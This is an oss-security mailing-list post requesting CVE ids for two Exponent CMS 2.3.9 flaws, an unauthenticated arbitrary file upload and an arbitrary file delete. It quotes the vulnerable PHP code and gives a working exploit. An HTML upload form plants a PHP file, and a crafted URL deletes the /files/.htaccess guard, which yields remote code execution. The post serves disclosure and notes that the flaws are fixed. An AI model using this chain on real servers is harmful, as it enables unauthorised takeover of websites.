@@ -1,0 +1,225 @@
+
+Date: Fri, 30 Sep 2016 16:52:15 +0800
+From: fyth <fyth.cnss@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: File Upload & File Delete lead to Unauthorized RCE in
+ Exponent CMS 2.3.9
+
+CVE Request: File Upload & File Delete lead to Unauthorized RCE in Exponent
+CMS 2.3.9
+
+Hi, I reported two vulnerabilities to the ExponentCMS team on 20th Sept
+2016:
+
+
+1.Arbitrary File Upload vulnerability
+
+/framework/modules/file/controllers/fileController.php
+
+line 529-565
+
+```
+
+    public function upload() {
+
+        // upload the file, but don't save the record yet...
+        if ($this->params['resize'] != 'false') {
+            $maxwidth = $this->params['max_width'];
+        } else {
+            $maxwidth = null;
+        }
+        $file =
+expFile::fileUpload('Filedata',false,false,null,null,$maxwidth);
+        // since most likely this function will only get hit via flash in
+YUI Uploader
+        // and since Flash can't pass cookies, we lose the knowledge of our
+$user
+        // so we're passing the user's ID in as $_POST data. We then
+instantiate a new $user,
+        // and then assign $user->id to $file->poster so we have an audit
+trail for the upload
+
+        if (is_object($file)) {
+            $resized = !empty($file->resized) ? true : false;
+            $user = new user($this->params['usrid']);
+            $file->poster = $user->id;
+            $file->posted = $file->last_accessed = time();
+            $file->save();
+            if (!empty($this->params['cat'])) {
+                $expcat = new expCat($this->params['cat']);
+                $params['expCat'][0] = $expcat->id;
+                $file->update($params);
+            }
+
+            // a echo so YUI Uploader is notified of the function's
+completion
+            if ($resized) {
+                echo gt('File resized and then saved');
+            } else {
+                echo gt('File saved');
+            }
+        } else {
+            echo gt('File was NOT uploaded!');
+//            flash('error',gt('File was not uploaded!'));
+        }
+    }
+
+
+```
+
+An unauthorized user can upload any file into the /files folder under
+Exponent directory, including malicious files such as PHP files.
+
+Exponent team put a .htaccess file under /files folder to prevent these
+malicious files from being executed with the following content:
+```
+<FilesMatch "\.(php|phps|pl|py|jsp|asp|htm|html|shtml|sh|cgi|txt)$">
+    ForceType text/plain
+</FilesMatch>
+
+```
+But, if we can somehow get rid of this .htaccess file, we can get a RCE
+vulnerability.
+
+2.Arbitrary File Delete vulnerability:
+
+/framework/modules/forms/controllers/formsController.php
+
+
+line 1939-2010:
+```
+    public function import_csv_data_add() {
+        global $user;
+
+        $line_end = ini_get('auto_detect_line_endings');
+        ini_set('auto_detect_line_endings',TRUE);
+        $file = fopen(BASE . $this->params["filename"], "r");
+        $recordsdone = 0;
+        $linenum = 1;
+        $f = new forms($this->params['forms_id']);
+        $f->updateTable();
+
+        $fields = array();
+        $multi_item_control_items = array();
+        $multi_item_control_ids = array();
+        foreach ($f->forms_control as $control) {
+            $fields[$control->name] = expUnserialize($control->data);
+            $ctltype = get_class($fields[$control->name]);
+            if
+(in_array($ctltype,array('radiogroupcontrol','dropdowncontrol'))) {
+                if
+(!array_key_exists($control->id,$multi_item_control_items)) {
+                    $multi_item_control_items[$control->name] = null;
+                    $multi_item_control_ids[$control->name] = $control->id;
+                }
+            }
+        }
+
+        while (($filedata = fgetcsv($file, 2000,
+$this->params["delimiter"])) != false) {
+            if ($linenum >= $this->params["rowstart"] &&
+in_array($linenum,$this->params['importrecord'])) {
+                $i = 0;
+                $db_data = new stdClass();
+                $db_data->ip = '';
+                $db_data->user_id = $user->id;
+                $db_data->timestamp = time();
+                $db_data->referrer = '';
+                $db_data->location_data = '';
+                foreach ($filedata as $field) {
+                    if (!empty($this->params["column"][$i]) &&
+$this->params["column"][$i] != "none") {
+                        $colname = $this->params["column"][$i];
+                        $control_type = get_class($fields[$colname]);
+                        $params[$colname] = $field;
+                        $def = call_user_func(array($control_type,
+"getFieldDefinition"));
+                        if (!empty($def)) {
+                            $db_data->$colname =
+call_user_func(array($control_type, 'convertData'), $colname, $params);
+                        }
+                        if (!empty($db_data->$colname) &&
+array_key_exists($colname,$multi_item_control_items) &&
+!in_array($db_data->$colname,$multi_item_control_items[$colname])) {
+                            $multi_item_control_items[$colname][] =
+$db_data->$colname;
+                        }
+                    }
+                    $i++;
+                }
+                $f->insertRecord($db_data);
+                $recordsdone++;
+            }
+            $linenum++;
+        }
+
+        fclose($file);
+        ini_set('auto_detect_line_endings',$line_end);
+
+        // update multi-item forms controls
+        if (!empty($multi_item_control_ids)) {
+            foreach ($multi_item_control_ids as $key=>$control_id) {
+                $fc = new forms_control($control_id);
+                $ctl = expUnserialize($fc->data);
+                $ctl->items = $multi_item_control_items[$key];
+                $fc->data = serialize($ctl);
+                $fc->update();
+            }
+        }
+        unlink(BASE . $this->params["filename"]);
+        flash('notice', $recordsdone.' '.gt('Records Imported'));
+        expHistory::back();
+    }
+```
+$this->params["filename"] is basically $_GET['filename'], without any
+sanitization.
+
+
+
+
+Exploit:
+
+The first step is to upload a php file using the following html, lets call
+it test.php
+
+
+<html>
+<body>
+
+<form action="
+http://yourexponentcms/?controller=file&action=upload&resize=false"
+method="post"
+enctype="multipart/form-data">
+Filename:
+<input type="file" name="Filedata" id="file">
+
+<input type="submit" name="submit" value="Submit">
+</form>
+
+</body>
+</html>
+
+
+And the second step is to delete the .htaccess file.
+http://yourexponentcms/index.php?controller=forms&action=import_csv_data_add&filename=files/.htaccess
+
+
+And now your http://yourexponentcms/files/test.php will be executed without
+any obstacles.
+
+
+
+
+And Now, these vulnerabilities have been fixed.
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/fdafb5ec97838e4edbd685f587f28d3174ebb3db
+https://github.com/exponentcms/exponent-cms/commit/fdafb5ec97838e4edbd685f587f28d3174ebb3db
+
+This issue was reported by Wang Chang of silence.com.cn Inc. and I would
+like
+to request CVE ids for these issues (if not done so).
+
+Thank you.
+---------------------------------http://www.silence.com.cn
+wangchang#silence.com.cn
+PKAV Team
+
